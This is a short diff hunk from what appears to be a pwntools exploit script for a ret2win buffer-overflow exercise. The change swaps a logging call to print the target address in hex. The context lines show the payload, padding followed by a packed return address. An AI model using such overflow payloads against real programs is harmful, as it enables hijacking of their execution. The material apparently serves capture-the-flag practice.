@@ -17,7 +17,7 @@ ret2win = 0x00400a00
 
 ret = 0x0804837e
 
-log.info(p32(ret2win))
+log.info(hex(ret2win))
 
 payload = b'A' * offset + p32(ret2win)
 
